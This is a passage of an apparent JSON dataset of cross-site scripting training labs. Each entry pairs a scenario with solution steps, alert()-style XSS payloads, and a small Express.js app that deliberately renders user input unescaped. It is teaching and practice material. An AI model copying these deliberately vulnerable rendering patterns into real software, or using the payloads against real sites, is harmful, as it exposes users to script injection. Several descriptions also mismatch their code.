      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/product/feedback', (req, res) => {\n  feedbacks.push(req.body.feedback);\n  res.redirect('/thankyou');\n});\napp.get('/admin/feedbacks', (req, res) => {\n  let html = '<html><body><h2>User Feedback</h2>';\n  feedbacks.forEach(f => { html += `<div>${f}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Document Preview Tool",
      "Lab Description": "An internal document preview tool reflects filename input from a query parameter without escaping. Malicious users can inject scripts through this input.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the document preview URL with a script payload in the query.",
        "Observe script execution in the preview header."
      ],
      "payloads": [
        "<script>alert('Preview XSS')</script>",
        "<img src=x onerror=alert('Preview XSS')>",
        "<svg/onload=alert('Preview XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const file = req.query.file;\n  res.send(`<html><body><h3>Previewing: ${file}</h3></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Event Description Field",
      "Lab Description": "A calendar app allows users to create public events with descriptions. The description field is rendered as raw HTML when attendees view the event details.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create a public event with an XSS payload in the description.",
        "View the event as another user.",
        "Observe script execution from the description content."
      ],
      "payloads": [
        "<script>alert('Event XSS')</script>",
        "<img src=x onerror=alert('Event XSS')>",
        "<svg/onload=alert('Event XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/event', (req, res) => {\n  events.push({ name: req.body.name, desc: req.body.desc });\n  res.redirect('/events');\n});\napp.get('/events', (req, res) => {\n  let html = '<html><body><h1>Upcoming Events</h1>';\n  events.forEach(e => { html += `<h2>${e.name}</h2><p>${e.desc}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Job Application Message",
      "Lab Description": "A job portal allows applicants to write a personal message to recruiters. These messages are displayed directly in the recruiter's dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an application with a malicious message.",
        "Login as recruiter and check incoming applications.",
        "Observe XSS execution in message area."
      ],
      "payloads": [
        "<script>alert('Job XSS')</script>",
        "<img src=x onerror=alert('Job XSS')>",
        "<svg/onload=alert('Job XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet apps = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/apply', (req, res) => {\n  apps.push(req.body.message);\n  res.redirect('/thanks');\n});\napp.get('/recruiter/inbox', (req, res) => {\n  let html = '<html><body><h2>Applications</h2>';\n  apps.forEach(a => { html += `<div>${a}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Report Generator Title",
      "Lab Description": "A business intelligence tool takes a title input via URL to label generated reports. This input is reflected on the report view page without sanitization.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Generate a report using a URL with a script in the title parameter.",
        "Observe the script executing in the report page title."
      ],
      "payloads": [
        "<script>alert('Report XSS')</script>",
        "<img src=x onerror=alert('Report XSS')>",
        "<svg/onload=alert('Report XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/report', (req, res) => {\n  const title = req.query.title;\n  res.send(`<html><body><h1>${title}</h1></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Internal Support Chat System",
      "Lab Description": "An internal support tool allows users to send messages to support agents. Messages are stored and rendered directly in the agent's inbox dashboard, exposing them to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a support message with a malicious payload.",
        "Login as a support agent and open the inbox.",
        "Observe the script executing from the message content."
      ],
      "payloads": [
        "<script>alert('Support XSS')</script>",
        "<img src=x onerror=alert('Support XSS')>",
        "<svg/onload=alert('Support XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet messages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/support/message', (req, res) => {\n  messages.push(req.body.text);\n  res.redirect('/support/thanks');\n});\napp.get('/agent/inbox', (req, res) => {\n  let html = '<html><body><h1>Inbox</h1>';\n  messages.forEach(m => { html += `<p>${m}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Customer Invoice Preview",
      "Lab Description": "A billing portal reflects user-provided invoice notes in the invoice preview URL without escaping input. Attackers can trick users into opening a crafted preview link.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject a payload in the note query parameter.",
        "Open the preview page and observe script execution."
      ],
      "payloads": [
        "<script>alert('Invoice XSS')</script>",
        "<img src=x onerror=alert('Invoice XSS')>",
        "<svg/onload=alert('Invoice XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/invoice/preview', (req, res) => {\n  const note = req.query.note;\n  res.send(`<html><body><h2>Invoice Note: ${note}</h2></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Course Review Submissions",
      "Lab Description": "An online learning platform lets students write course reviews. Reviews are shown to instructors and future students without sanitization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a course review containing an XSS payload.",
        "View the course page or login as instructor to see the review.",
        "Observe the script execution on the course page."
      ],
      "payloads": [
        "<script>alert('Review XSS')</script>",
        "<img src=x onerror=alert('Review XSS')>",
        "<svg/onload=alert('Review XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => {\n  reviews.push(req.body.review);\n  res.redirect('/courses/1');\n});\napp.get('/courses/1', (req, res) => {\n  let html = '<html><body><h1>Course Reviews</h1>';\n  reviews.forEach(r => { html += `<div>${r}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Contact Form Error Display",
      "Lab Description": "The contact form includes the user's submitted name and subject in error messages when validation fails. These inputs are reflected without sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a contact form with an invalid subject and an XSS payload in the name field.",
        "Trigger the error page and observe XSS execution."
      ],
      "payloads": [
        "<script>alert('Contact XSS')</script>",
        "<img src=x onerror=alert('Contact XSS')>",
        "<svg/onload=alert('Contact XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  const subject = req.body.subject;\n  if (!subject) {\n    res.send(`<html><body><h1>Error: Subject required</h1><p>${name}</p></body></html>`);\n  } else {\n    res.redirect('/thanks');\n  }\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Custom Profile Badge Generator",
      "Lab Description": "A developer forum allows users to design profile badges using HTML snippets. These snippets are rendered as-is in member profiles, enabling persistent XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a badge with embedded XSS payload.",
        "Visit the profile page to see it rendered.",
        "Observe XSS triggering in the badge section."
      ],
      "payloads": [
        "<script>alert('Badge XSS')</script>",
        "<img src=x onerror=alert('Badge XSS')>",
        "<svg/onload=alert('Badge XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet badge = '';\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/profile/badge', (req, res) => {\n  badge = req.body.snippet;\n  res.redirect('/profile');\n});\napp.get('/profile', (req, res) => {\n  res.send(`<html><body><h1>User Profile</h1><div>${badge}</div></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Project Description Field",
      "Lab Description": "A project management tool allows users to update project descriptions. The input is rendered in the project dashboard without sanitization, leading to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login and navigate to the project settings page.",
        "Submit a new description containing a malicious payload.",
        "Visit the project dashboard and observe script execution."
      ],
      "payloads": [
        "<script>alert('Project XSS')</script>",
        "<img src=x onerror=alert('Project XSS')>",
        "<svg/onload=alert('Project XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet description = 'Initial project overview.';\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/project/update-description', (req, res) => {\n  description = req.body.desc;\n  res.redirect('/project/dashboard');\n});\napp.get('/project/dashboard', (req, res) => {\n  res.send(`<html><body><h1>Project Dashboard</h1><p>${description}</p></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Job Search Portal",
      "Lab Description": "A job board reflects user-provided keywords in the search results page title without encoding. This creates a vector for reflected XSS attacks.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject an XSS payload into the job search query parameter.",
        "Load the search results page and confirm script execution."
      ],
      "payloads": [
        "<script>alert('Search XSS')</script>",
        "<img src=x onerror=alert('Search XSS')>",
        "<svg/onload=alert('Search XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/search', (req, res) => {\n  const q = req.query.q;\n  res.send(`<html><title>${q}</title><body>Results for ${q}</body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in E-commerce Order Notes",
      "Lab Description": "An e-commerce platform allows customers to leave optional notes on orders. These notes are shown to admins in the order panel without any sanitization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit an order with a malicious note.",
        "Login as an admin and view the order.",
        "Observe the execution of the injected script."
      ],
      "payloads": [
        "<script>alert('Order XSS')</script>",
        "<img src=x onerror=alert('Order XSS')>",
        "<svg/onload=alert('Order XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet notes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/order/submit', (req, res) => {\n  notes.push(req.body.note);\n  res.redirect('/order/confirm');\n});\napp.get('/admin/orders', (req, res) => {\n  let html = '<html><body><h1>Orders</h1>';\n  notes.forEach(n => { html += `<div>${n}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Survey Result Page",
      "Lab Description": "A survey tool displays answers in the result page directly using query parameters. Inputs are not escaped properly, making it vulnerable to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject payload into a survey answer field.",
        "Submit the form and observe the result rendering.",
        "Script should execute on the result page."
      ],
      "payloads": [
        "<script>alert('Survey XSS')</script>",
        "<img src=x onerror=alert('Survey XSS')>",
        "<svg/onload=alert('Survey XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/survey/result', (req, res) => {\n  const answer = req.query.answer;\n  res.send(`<html><body><h2>Your Answer: ${answer}</h2></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in File Sharing App File Titles",
      "Lab Description": "A file sharing service allows users to upload files and set custom titles. The titles are rendered in other users\u00e2\u20ac\u2122 dashboards without sanitization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload a file with a title containing an XSS payload.",
        "Login as another user and view the shared files.",
        "Observe the execution of the injected script."
      ],
      "payloads": [
        "<script>alert('File XSS')</script>",
        "<img src=x onerror=alert('File XSS')>",
        "<svg/onload=alert('File XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet files = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/upload', (req, res) => {\n  files.push(req.body.title);\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  let html = '<html><body><h1>Shared Files</h1>';\n  files.forEach(f => { html += `<p>${f}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Event Management App Location Field",
      "Lab Description": "An event platform allows users to create events and specify the location. The location is displayed on the public event page without sanitization, making it vulnerable to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create an event and enter an XSS payload in the location field.",
        "Visit the event detail page.",
        "Observe script execution from the stored payload."
      ],
      "payloads": [
        "<script>alert('Location XSS')</script>",
        "<img src=x onerror=alert('Location XSS')>",
        "<svg/onload=alert('Location XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/event/create', (req, res) => {\n  events.push({ name: req.body.name, location: req.body.location });\n  res.redirect('/event/list');\n});\napp.get('/event/list', (req, res) => {\n  let html = '<html><body><h1>Events</h1>';\n  events.forEach(e => { html += `<div><h3>${e.name}</h3><p>${e.location}</p></div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in User Invitation Email Preview",
      "Lab Description": "An admin portal allows previewing an invitation email before sending. The name field is directly injected into the email preview without proper encoding.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the invitation preview form and insert a payload in the name field.",
        "Click the preview button.",
        "Observe the XSS in the email preview output."
      ],
      "payloads": [
        "<script>alert('Invite XSS')</script>",
        "<img src=x onerror=alert('Invite XSS')>",
        "<svg/onload=alert('Invite XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/invite/preview', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h2>Email Preview</h2><p>Hello ${name}, you are invited!</p></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Video Platform Commenting System",
      "Lab Description": "A video-sharing platform allows users to comment under videos. Comments are rendered using innerHTML without sanitization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post a comment with an XSS payload.",
        "Visit the video page as another user.",
        "Observe the payload being executed in the comment section."
      ],
      "payloads": [
        "<script>alert('Comment XSS')</script>",
        "<img src=x onerror=alert('Comment XSS')>",
        "<svg/onload=alert('Comment XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/video');\n});\napp.get('/video', (req, res) => {\n  let html = '<html><body><h1>Video Title</h1>';\n  comments.forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in Support Ticket Viewer",
      "Lab Description": "A support dashboard reads the ticket title from the URL hash and injects it using innerHTML into the page header without validation.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the ticket viewer with a crafted URL containing a payload in the hash.",
        "Observe script execution via DOM-based injection."
      ],
      "payloads": [
        "<script>alert('DOM XSS')</script>",
        "<img src=x onerror=alert('DOM XSS')>",
        "<svg/onload=alert('DOM XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/ticket', (req, res) => {\n  res.send(`<html><body><h1 id='title'></h1><script>document.getElementById('title').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Portfolio Site Testimonial Submission",
      "Lab Description": "A personal portfolio website allows visitors to submit testimonials. Submissions are stored and displayed in the testimonials section without escaping.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a testimonial with an XSS payload.",
        "Visit the homepage and observe execution of the stored script."
      ],
      "payloads": [
        "<script>alert('Testimonial XSS')</script>",
        "<img src=x onerror=alert('Testimonial XSS')>",
        "<svg/onload=alert('Testimonial XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet testimonials = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/submit-testimonial', (req, res) => {\n  testimonials.push(req.body.message);\n  res.redirect('/');\n});\napp.get('/', (req, res) => {\n  let html = '<html><body><h1>My Portfolio</h1><div>';\n  testimonials.forEach(t => { html += `<blockquote>${t}</blockquote>`; });\n  res.send(html + '</div></body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Shopping Cart Coupon Code Input",
      "Lab Description": "An e-commerce site reflects the coupon code directly into the cart confirmation page. The input is inserted into the DOM without escaping, making it vulnerable to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit the cart page with a crafted coupon code containing an XSS payload.",
        "Observe the payload being executed in the response."
      ],
      "payloads": [
        "<script>alert('Coupon XSS')</script>",
        "<img src=x onerror=alert('Coupon XSS')>",
        "<svg/onload=alert('Coupon XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/cart', (req, res) => {\n  const code = req.query.coupon;\n  res.send(`<html><body><h1>Your Cart</h1><p>Coupon Applied: ${code}</p></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Online Course Review",
      "Lab Description": "A learning platform lets students leave reviews on courses. Reviews are rendered using raw HTML, and no sanitization is applied to the input.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post a review containing an XSS payload.",
        "Access the course page as another user.",
        "Observe script execution in the review section."
      ],
      "payloads": [
        "<script>alert('Review XSS')</script>",
        "<img src=x onerror=alert('Review XSS')>",
        "<svg/onload=alert('Review XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/review', (req, res) => {\n  reviews.push(req.body.text);\n  res.redirect('/course');\n});\napp.get('/course', (req, res) => {\n  let html = '<html><body><h1>Course Reviews</h1>';\n  reviews.forEach(r => { html += `<div>${r}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in Blog Article Viewer via Location Fragment",
      "Lab Description": "A blog viewer script displays additional notes from the URL fragment. The content is inserted using innerHTML, making it exploitable for DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Open the blog viewer with a crafted hash payload.",
        "Observe JavaScript execution from the fragment.",
        "Confirm it is injected via DOM methods."
      ],
      "payloads": [
        "<script>alert('Blog XSS')</script>",
        "<img src=x onerror=alert('Blog XSS')>",
        "<svg/onload=alert('Blog XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/blog', (req, res) => {\n  res.send(`<html><body><h1>Blog Article</h1><div id='notes'></div><script>document.getElementById('notes').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Team Collaboration Chat",
      "Lab Description": "A collaboration tool allows users to send chat messages in a team workspace. Messages are rendered using innerHTML without sanitization, making the system vulnerable to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a crafted message with an XSS payload.",
        "Visit the chat window as another user.",
        "Observe automatic script execution."
      ],
      "payloads": [
        "<script>alert('Chat XSS')</script>",
        "<img src=x onerror=alert('Chat XSS')>",
        "<svg/onload=alert('Chat XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet messages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/chat/send', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/chat');\n});\napp.get('/chat', (req, res) => {\n  let html = '<html><body><h1>Team Chat</h1>';\n  messages.forEach(m => { html += `<p>${m}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Travel Booking Confirmation Page",
      "Lab Description": "A travel site reflects user names from query parameters on the booking confirmation page. The name is displayed in raw HTML, enabling XSS if not properly encoded.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the booking confirmation URL with a malicious payload in the name parameter.",
        "Confirm that the script is reflected and executed."
      ],
      "payloads": [
        "<script>alert('Booking XSS')</script>",
        "<img src=x onerror=alert('Booking XSS')>",
        "<svg/onload=alert('Booking XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/confirm', (req, res) => {\n  const name = req.query.name;\n  res.send(`<html><body><h1>Thank you ${name} for your booking!</h1></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Password Reset Token Display",
      "Lab Description": "A password reset tool echoes the token from the URL onto the page for debugging. The token is inserted into the DOM using innerHTML, allowing reflected XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit the password reset page with a crafted `token` parameter containing a script payload.",
        "Observe the token reflected without encoding and triggering script execution."
      ],
      "payloads": [
        "<script>alert('Token XSS')</script>",
        "<img src=x onerror=alert('Token XSS')>",
        "<svg/onload=alert('Token XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/reset-password', (req, res) => {\n  const token = req.query.token;\n  res.send(`<html><body><h2>Reset your password</h2><div id='token'>Token: ${token}</div></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in e-Learning Quiz Feedback",
      "Lab Description": "An online quiz system lets users leave feedback on questions. Feedback is rendered without escaping input, making it vulnerable to stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit feedback containing an XSS payload.",
        "Navigate to the quiz review page.",
        "Observe payload execution."
      ],
      "payloads": [
        "<script>alert('Quiz XSS')</script>",
        "<img src=x onerror=alert('Quiz XSS')>",
        "<svg/onload=alert('Quiz XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/feedback', (req, res) => {\n  feedbacks.push(req.body.comment);\n  res.redirect('/quiz');\n});\napp.get('/quiz', (req, res) => {\n  let html = '<html><body><h1>Quiz Feedback</h1>';\n  feedbacks.forEach(f => { html += `<div>${f}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Survey System Result Page",
      "Lab Description": "A survey result page reflects survey answers from the URL query. The answer is written to the DOM directly using innerHTML.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft a URL with a malicious value for the `answer` parameter.",
        "Visit the result page and observe the execution of the payload."
      ],
      "payloads": [
        "<script>alert('Survey XSS')</script>",
        "<img src=x onerror=alert('Survey XSS')>",
        "<svg/onload=alert('Survey XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/survey/result', (req, res) => {\n  const answer = req.query.answer;\n  res.send(`<html><body><h1>Survey Result</h1><div>${answer}</div></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Issue Tracker Comment Section",
      "Lab Description": "An internal issue tracker allows engineers to leave comments. The comments are rendered using raw HTML, enabling XSS via stored payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a comment with an XSS payload.",
        "View the issue page and confirm script execution."
      ],
      "payloads": [
        "<script>alert('Issue XSS')</script>",
        "<img src=x onerror=alert('Issue XSS')>",
        "<svg/onload=alert('Issue XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/issue/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/issue');\n});\napp.get('/issue', (req, res) => {\n  let html = '<html><body><h1>Issue Comments</h1>';\n  comments.forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in URL-Based Search Filter",
      "Lab Description": "A product listing page updates the search term from the URL hash and injects it into the DOM using innerHTML without sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Load the page with a hash that includes a malicious XSS payload.",
        "Observe DOM-based XSS execution via innerHTML."
      ],
      "payloads": [
        "<script>alert('Search XSS')</script>",
        "<img src=x onerror=alert('Search XSS')>",
        "<svg/onload=alert('Search XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/search', (req, res) => {\n  res.send(`<html><body><h1>Search Products</h1><div id='term'></div><script>document.getElementById('term').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Blog Comment Reply System",
      "Lab Description": "A blogging platform allows users to reply to comments. Replies are displayed without escaping user input, leading to stored XSS when viewing blog posts.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a malicious reply containing an XSS payload.",
        "Visit the post page and observe the payload executing in the context of the page."
      ],
      "payloads": [
        "<script>alert('Reply XSS')</script>",
        "<img src=x onerror=alert('Reply XSS')>",
        "<svg/onload=alert('Reply XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet replies = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/reply', (req, res) => {\n  replies.push(req.body.text);\n  res.redirect('/post');\n});\napp.get('/post', (req, res) => {\n  let html = '<html><body><h1>Post and Replies</h1>';\n  replies.forEach(r => { html += `<div>${r}</div>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Newsletter Preview",
      "Lab Description": "The admin panel of a newsletter system previews email content by reflecting a `preview` parameter in the response. The content is injected directly into a content block using innerHTML.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft a URL to the newsletter preview endpoint with an XSS payload as the `preview` parameter.",
        "Access the URL and observe the payload execution."
      ],
      "payloads": [
        "<script>alert('Preview XSS')</script>",
        "<img src=x onerror=alert('Preview XSS')>",
        "<svg/onload=alert('Preview XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/admin/preview', (req, res) => {\n  const preview = req.query.preview;\n  res.send(`<html><body><h2>Newsletter Preview</h2><div>${preview}</div></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in Job Portal Search",
      "Lab Description": "A job search page updates a results heading based on a keyword from the URL fragment. It inserts the value into the DOM via innerHTML, making it vulnerable to DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the job search page with a crafted fragment identifier containing a script payload.",
        "Observe script execution due to unsafe insertion."
      ],
      "payloads": [
        "<script>alert('Job Search XSS')</script>",
        "<img src=x onerror=alert('Job Search XSS')>",
        "<svg/onload=alert('Job Search XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/jobs', (req, res) => {\n  res.send(`<html><body><h2 id='result'></h2><script>document.getElementById('result').innerHTML = location.hash.slice(1);</script></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Event Management Comments",
      "Lab Description": "An event platform allows users to comment on event pages. Comments are stored and rendered without escaping, leading to persistent XSS when others view the page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post a malicious comment.",
        "View the event page and confirm the XSS payload is executed."
      ],
      "payloads": [
        "<script>alert('Event Comment XSS')</script>",
        "<img src=x onerror=alert('Event Comment XSS')>",
        "<svg/onload=alert('Event Comment XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/event/comment', (req, res) => {\n  comments.push(req.body.message);\n  res.redirect('/event');\n});\napp.get('/event', (req, res) => {\n  let html = '<html><body><h1>Event Page</h1>';\n  comments.forEach(c => { html += `<p>${c}</p>`; });\n  res.send(html + '</body></html>');\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Online Calculator Input Echo",
      "Lab Description": "A web-based calculator reflects the input expression in the output panel using innerHTML without sanitization. This allows reflected XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an expression with a script payload in the query string.",
        "Observe the output reflecting the payload and triggering JavaScript."
      ],
      "payloads": [
